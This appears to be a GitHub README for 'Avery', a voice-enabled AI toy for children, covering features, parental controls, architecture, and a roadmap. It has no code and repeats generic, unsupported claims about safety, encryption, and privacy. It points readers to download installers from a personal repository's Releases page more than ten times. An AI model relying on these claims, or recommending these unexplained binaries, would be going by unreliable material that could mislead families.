https://github.com/baba286/avery/releases

[![Release](https://img.shields.io/badge/Release-Avery%20Latest-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/baba286/avery/releases)

![Avery Illustration](https://upload.wikimedia.org/wikipedia/commons/thumb/3/34/Robot_icon.svg/640px-Robot_icon.svg.png)

# Avery: Safe, Voice-Enabled AI Toy for Kids – Learn, Play, Protect

Avery is a voice-enabled AI companion designed for children. It listens, learns, and helps kids explore the world while keeping them safe. The system focuses on privacy-first data handling, parental controls, offline capability, and clear kid-friendly interactions. This guide explains what Avery does, how to use it, and how to contribute to the project.

Avery brings together speech recognition, text-to-speech, and a lightweight AI core that can run offline. It is designed to be a calm, educational, and protective presence in a family tech setup. The project aligns with AI for children, child development, and safety goals. It aims to be a trusted friend that encourages curiosity, storytelling, learning, and safe exploration of environments both near and far.

Note: the release page is the primary source for binaries, installers, and updates. The Releases page contains the downloadable assets for different platforms. If the link changes or the page is temporarily unavailable, check the Releases section for the latest files and instructions.

Table of contents
- Why Avery exists
- Core values and safety principles
- Features at a glance
- How Avery works
- System architecture
- Getting started
- Running Avery locally
- Offline by design
- Privacy and parental controls
- Content safety and filtering
- Accessibility and inclusive design
- Data and memory management
- Developer and contributor guide
- Code structure and key components
- Testing and quality assurance
- Build and release process
- Performance considerations
- Internationalization and language support
- UI/UX design decisions
- Troubleshooting
- Security and safety notes
- Roadmap
- Community and governance
- Licensing
- Acknowledgments

Why Avery exists
Avery was created to help children learn through conversation, play, and exploration while giving guardians confidence about safety and privacy. The project responds to a common need: a child-facing assistant that is easy to understand, predictable in behavior, and respectful of a family’s values. Avery emphasizes privacy by default, minimizes data collection, and runs core features locally when possible. It also provides clear controls for caregivers to guide interactions and content.

Core values and safety principles
- Privacy-first by design: local processing where feasible, minimal data retention, and transparent data practices.
- Child-friendly interactions: language that is simple, constructive, and safe for kids.
- Parental controls: easy-to-use settings to manage features, content, and memory.
- Safety-focused memory: short-lived on-device memories and opt-in cloud storage with explicit user consent.
- Accessibility: inclusive features for a broad range of abilities and languages.
- Transparency: clear explanations of capabilities and limitations, without hype or overpromising.

Features at a glance
- Voice-driven dialogue: Avery uses speech recognition to understand spoken input and TTS to respond in a natural voice.
- Offline AI core: core features can run without a constant internet connection, reducing exposure to external servers.
- Child safety features: content filtering, safe-word prompts, and clear blocking of unsafe topics.
- Parental controls: customizable limits, activity summaries, and memory management policies.
- Educational play: storytelling, questions, science facts, and age-appropriate learning prompts tailored to development stage.
- Multi-language support: designed to support several languages with easy-to-switch options.
- Lightweight memory: ephemeral memory for ongoing conversations, with user-controlled retention.
- Audio cues and feedback: accessible cues, gentle prompts, and confirmation of actions.

How Avery works
Avery is built to be straightforward to understand and simple to audit. The architecture emphasizes on-device processing for core tasks, with optional cloud-backed features that guardians can enable if desired. The user experience centers on natural conversations that feel calm and engaging.

- Input: The user speaks to Avery. Microphone access and voice activity detection determine when to listen.
- Processing: The spoken input is converted to text, analyzed, and mapped to an appropriate action. The AI core uses a bounded context to avoid overfitting on long conversations.
- Output: Avery responds with natural-sounding speech, plus optional visual cues on supported devices.
- Safety and policy: A safety layer checks for harmful content, disallowed topics, or potential safety concerns. If a request is risky, Avery provides a safe alternative or defers to a caregiver.
- Memory and memory management: Conversations are stored with caregiver control. Memory is designed to be short-lived unless explicitly saved. Sensitive data is protected and can be purged.
- Privacy controls: Data flows are designed to be transparent. Caregivers choose what is stored, for how long, and where. On-device processing reduces the need for cloud requests.

System architecture
Avery’s architecture balances usability, performance, and safety. It aims to be adaptable across devices while keeping the interface predictable for children.

- Front end: A cross-platform interface that can run on desktop, tablet, or dedicated devices. It uses a simple, child-friendly UI with large touch targets and clear prompts.
- Voice stack: Speech recognition and synthesis form the core of the user interaction. The voice stack is optimized for clarity and low latency.
- AI core: A lightweight, privacy-conscious AI engine that handles natural language understanding, dialog management, and content filtering.
- Memory layer: A session memory store that preserves recent context. It resets after a defined period or on caregiver request.
- Policy engine: Rules that govern safe interactions, parental controls, and content restrictions.
- Data layer: Local storage for on-device data with optional secure cloud backing. Data access is controlled and auditable.
- Security and hardening: Strong authentication and permissions, minimal privilege usage, and regular security reviews.

Getting started
To begin using Avery, you will typically follow these steps. The goal is to provide a smooth setup experience for families and educators who want to bring an AI companion into daily life.

- Prerequisites
  - A supported device with compatible operating system versions.
  - Sufficient disk space for the application, its assets, and a small amount of cached data.
  - A stable power source for devices used by children during interactions.
  - Audio input/output hardware that works well with the built-in speech stack.

- Downloading the release
  - The primary distribution channel for Avery is the release page. You can download the installer or package that matches your platform from the Releases page.
  - For convenience, you can use the release badge or click through the Releases page to pick the right file.
  - If you encounter issues, check the Releases section for alternative assets or updated instructions.

- Installation
  - Run the installer or follow platform-specific installation steps provided with the release.
  - The installer configures base settings, creates initial user profiles, and prompts you to set up caregiver preferences.
  - After installation, you will be guided through an initial setup wizard to calibrate the microphone, select a preferred language, and customize safety settings.

- First run and calibration
  - During the first run, Avery will request permission to access the microphone and audio output.
  - You will input the child’s age or development level to tailor responses.
  - The setup can be adjusted at any time from the Settings menu.

- Basic use
  - Start with a few simple prompts to get Avery to respond in a friendly, predictable manner.
  - Explore storytelling prompts, simple science questions, and safety-related queries to gauge how Avery handles content.

- Safety and privacy defaults
  - By default, Avery minimizes data collection and stores only what is necessary for core interactions.
  - Parental controls are enabled out of the box, and caregivers can adjust them as needed.

- Updating
  - When a new release is available, the updater will prompt you to install the update. You can also visit the Releases page to obtain the latest version.
  - Keeping Avery up to date helps ensure the latest safety features and content is available.

Offline by design
Avery emphasizes offline operation to protect privacy and reduce reliance on external services. Core features like speech recognition, response generation, and content filtering can operate without an internet connection. The offline mode is designed to be robust enough for everyday conversations, storytelling, and guided learning activities. When online features are enabled, they are opt-in and controlled by the caregiver.

- What runs offline
  - Core dialog management
  - Local memory system for recent conversations
  - On-device speech recognition and synthesis for immediate feedback
  - Basic content filtering and safety checks

- What may require online resources
  - Expanded knowledge lookup or cloud-based updates
  - Language models that require richer resources
  - Optional features that rely on real-time data or dynamic content

- How to enable offline mode
  - The setting is available in the main Preferences panel. Turn off cloud-connected features to maximize on-device processing.

Privacy and parental controls
Avery puts caregivers in control. The app provides transparent privacy settings and easy-to-understand controls. Parents or guardians can adjust what Avery can say, what topics are allowed, how long conversations are stored, and who can access activity reports.

- Core principles
  - Clear consent: users or guardians opt in to any data sharing.
  - Minimal retention: avoid unnecessary long-term storage of voice data.
  - Content safety first: disallow dangerous or inappropriate topics.
  - Age-appropriate: adjust language, tone, and content to the child’s age.

- Guardrails and settings
  - Safe topics: A preset list for science, math, reading, nature, and everyday safety.
  - Blocked topics: A configurable list of topics that Avery must avoid.
  - Memory controls: Time-based or event-based memory clearance; caregiver can purge conversations.
  - Activity reports: Recap of interactions that can be shared with guardians.

Content safety and filtering
Avery uses layered safety checks to keep interactions appropriate for children. The family experience is designed to be positive, constructive, and non-threatening. The safety model uses a whitelist-based approach where allowed content is curated, and disallowed content is replaced with safe alternatives.

- Filtering approach
  - Real-time filter for language and sensitive topics.
  - Safe alternatives or redirection when a topic is not allowed.
  - Escalation path to caregiver when needed.

- Examples
  - If a child asks about dangerous activities, Avery provides a general safety warning and redirects to a safer topic.
  - If a child asks a potentially confusing medical question, Avery explains in simple terms and suggests asking a trusted adult.

Accessibility and inclusive design
Avery supports users with diverse abilities. The interface uses high-contrast themes, scalable text, and support for screen readers. Voice UI is designed to be intuitive for children and caregivers alike.

- Keyboard and assistive navigation
  - All actions can be performed via keyboard with clear focus indicators.
  - Large touch targets for tablets and touch devices.

- Multilingual support
  - Primary language is selected at setup. Additional languages can be added via language packs.
  - Pronunciation and tone can be tuned to improve comprehension for non-native speakers.

- Visual accessibility
  - Clear icons and consistent color usage for essential actions.
  - Simple, predictable animations that do not overwhelm.

Data and memory management
Avery’s memory design aims to balance conversational usefulness with privacy. The app stores only the necessary data for the user experience and allows caregivers to manage retention policies.

- Session memory
  - Stores recent dialogue context for natural conversations.
  - Automatically purges after a defined period, unless memory is explicitly saved.

- Long-term memory
  - Optional and opt-in by caregiver. Stored securely with explicit consent.
  - Designed to support tailored learning and personalized prompts while preserving privacy.

- Data access and security
  - Data is stored with strong encryption on-device and in the cloud if enabled.
  - Access is restricted to the app and the user’s caregiver account.

Developer and contributor guide
Avery is open to contributions. The guide covers repository structure, how to contribute, coding standards, testing, and release processes. The project welcomes contributors who want to extend features, improve safety, or polish the user experience.

- Code style and standards
  - Clear, readable code with small, focused modules.
  - Consistent naming and documentation.
  - Unit tests accompany core features.

- How to contribute
  - Start with issues labeled "good first issue" or "help wanted."
  - Fork the repository, create a feature branch, and open a pull request with a clear description.
  - Run tests locally and ensure no regressions.

- Testing and quality assurance
  - Automated tests cover critical paths: voice input, output, memory handling, and safety checks.
  - Manual testing covers user flows, accessibility, and cross-device behavior.

Code structure and key components
Avery’s codebase is organized to support cross-platform use while keeping modules decoupled and testable.

- Core
  - Dialog engine: manages turn-taking and context.
  - NLU: natural language understanding for intent and entities.
  - Safety and policy: ensures safe responses and content boundaries.

- Voice
  - Speech recognition: interprets spoken input.
  - Speech synthesis: converts text to natural-sounding speech.

- Memory
  - Session memory: within a single activity or session.
  - Persistent memory: optional long-term memory with permissions.

- UI
  - Cross-platform interface with a child-friendly design.
  - Settings and caregiver controls integrated into a simple panel.

- Data layer
  - Local storage with secure encryption.
  - Cloud options when enabled by the caregiver.

- Tools and utilities
  - Testing utilities, sample datasets, and localization tools.

- Platform adaptations
  - Desktop-centric interface with mobile-ready components.
  - Optimizations for low-power devices and efficient audio processing.

Testing and quality assurance
Quality comes first. The project uses automated tests for critical functions and manual testing for usability and safety. Test suites cover:

- Voice input accuracy and latency
- Dialog flow and memory handling
- Safety filters and content redirection
- Settings persistence and privacy options
- Accessibility checks and keyboard navigation
- Localization and language support

Build and release process
The project follows a disciplined release process to ensure stability and reliability across versions. Releases include binaries, installers, and documentation for each platform.

- Versioning
  - Semantic versioning is used to track changes and compatibility.
  - Major updates introduce new capabilities; minor updates refine features; patches fix bugs.

- Release process
  - A release is prepared with a changelog, tests, and validated builds.
  - Binaries are uploaded to the Releases page for platform-specific installation.

- Continuous integration
  - CI pipelines run automated tests on every pull request.
  - Linting, unit tests, and integration tests are part of the pipeline.

Performance considerations
Avery is designed to be lightweight and responsive. The performance goals focus on:

- Low latency interaction: quick recognition and response to spoken input.
- Efficient energy use: battery-friendly operation on mobile devices.
- Reasonable memory footprint: bounded memory to avoid leaks and excessive usage.
- Scalability: architecture supports future feature expansion without a complete rewrite.

Internationalization and language support
Avery supports multiple languages and scripts. The approach prioritizes clear pronunciation, easy switching between languages, and culturally aware content.

- Language packs
  - Each language pack includes pronunciation rules, common phrases, and locale-specific content.
  - Language switching can be done mid-session with a simple command.

- Localization for content
  - Content prompts, safety messages, and examples are translated.
  - Caregivers can tailor prompts to reflect local culture and norms.

UI/UX design decisions
The interface emphasizes clarity and simplicity. The design choices aim to reduce cognitive load and provide predictable interactions for children and caregivers.

- Visual design
  - Large icons, friendly shapes, and gentle color palettes.
  - Consistent layout with minimal clutter.

- Interaction patterns
  - Clear prompts and confirmations for actions that affect memory or safety.
  - Gentle, non-intrusive audio cues for events like new messages or completion.

- Content presentation
  - Short, positive statements for kids.
  - Explanations that are easy to understand and age-appropriate.

Troubleshooting
If you encounter issues, start with these checks:

- Ensure your device is on a supported platform and meets the minimum requirements.
- Confirm microphone and speaker devices are configured correctly.
- Check that Avery has permission to access audio input/output in your system settings.
- Review caregiver settings for any restrictive options that may affect interactions.
- Look at the Releases page for updated builds or known issues and suggested workarounds.

Security and safety notes
Avery is designed with security and safety as a core concern. The architecture uses best practices to reduce risk and to provide a transparent user experience.

- Data access controls: Only approved components access stored data.
- Encryption: Sensitive data is encrypted both at rest and in transit where applicable.
- Regular updates: Security fixes and safety improvements are included in updates.
- Safety policy: The system enforces content restrictions designed for children.

Roadmap
Avery’s roadmap outlines planned improvements and new features. The roadmap guides development while keeping the project aligned with safety and privacy goals.

- Short term (next release cycle)
  - Expand language support and improve pronunciation accuracy.
  - Refine memory controls and caregiver dashboards.
  - Enhance offline capabilities for more robust core features.

- Medium term (3-6 releases)
  - Add more educational modules and storytelling templates.
  - Improve content filtering with expanded topic categories.
  - Integrate with family calendars for reminders and safety routines.

- Long term (beyond 6 releases)
  - Advanced learning analytics with caregiver consent.
  - Cross-device synchronization for a cohesive family experience.
  - richer offline knowledge base with adaptive learning prompts.

Community and governance
Avery encourages open collaboration. The project follows a light governance model that emphasizes transparency and inclusivity.

- Code of conduct
  - Respectful communication and collaboration.
  - Safe handling of issues and PRs with clear guidance for all participants.

- Issues and discussions
  - Open for bug reports, feature requests, and design discussions.
  - Use issue templates to provide structured information.

- Documentation and learning
  - The docs repo and this README provide guidelines for contributors.
  - Tutorials and examples help newcomers get started.

Licensing
Avery is released under an open source license. The license text describes allowed use, redistribution, and any restrictions. The project aims to balance openness with user safety. Please review the license for details and terms.

Acknowledgments
Avery builds on the work of many contributors and uses community resources. Special thanks go to families who participated in usability studies and to educators who provided feedback on learning content. The project recognizes the broader AI safety community and respects the rights of users, compliance requirements, and privacy principles.

Downloads and releases
For the latest assets, visit the releases page. The Release page contains installers and packages for different environments. If you cannot access the page, check the Releases section for details and alternative download options.

- Release assets
  - Desktop installers for Windows, macOS, and Linux.
  - Mobile-ready builds for supported tablet environments.
  - Companion assets such as language packs and optional content bundles.

- How to obtain assets
  - Click through the Releases page to identify the asset that matches your device.
  - Download the asset and follow the installation instructions.
  - If the asset fails to download or install, report the issue and check for alternative formats in the same page.

- Quick start with releases
  - Start with the latest stable release for a smooth experience.
  - If you want to test new features, try a beta release if available and follow the included guidance.

Note: You can also visit the Releases page to review the latest improvements, fixes, and new content. For convenience, the release assets are organized to help families and educators pick the right option quickly.

Additional references and resources
- Family tech and safety ecosystems
  - How to create a safe technology environment for children.
  - Best practices for parental controls and open discussions about AI in households.

- Child development and learning
  - Using conversational agents to support literacy, curiosity, and problem-solving.
  - Balancing screen time with offline activities and guided play.

- Privacy-friendly AI design
  - Principles for building AI that respects user privacy.
  - Techniques for minimizing data collection and maximizing user control.

- Speech and language tech
  - Fundamentals of speech recognition and natural language generation.
  - Tips for optimizing for children’s voices and pronunciation.

- Accessibility and inclusive design
  - Designing interfaces that work for diverse abilities.
  - Ensuring compatibility with assistive technologies.

- Community guidelines
  - How to engage respectfully with contributors.
  - How to propose changes and review process.

Usage notes and disclaimers
Avery is designed to be a helpful companion for children. It is not a substitute for real-world supervision or professional advice in domains like education, health, safety, or legal matters. Caregivers should supervise interactions and set appropriate boundaries. The system’s safety checks aim to reduce risks, but no system is perfect. If you encounter questionable content or behavior, report it and adjust caregiver controls accordingly.

Releases and download guidance
If you need to obtain the latest assets or verify the version, use the releases page. The link is provided for your convenience, and you can access the page to download the appropriate installer or package for your platform. The release assets are updated with each version, and the page includes release notes and instructions. If the link is temporarily unavailable, check the Releases section for status updates and alternative download options.

Second reference to the release link
For ongoing updates and new features, check the release page again. The release assets are curated to ensure the safest and most reliable experience for children and families. If you’re exploring contributions or testing new capabilities, the releases page serves as the central hub for downloads and change information.

This README is designed to be comprehensive while staying accessible. It emphasizes practical steps, safety considerations, and a thoughtful approach to building a family-friendly AI companion.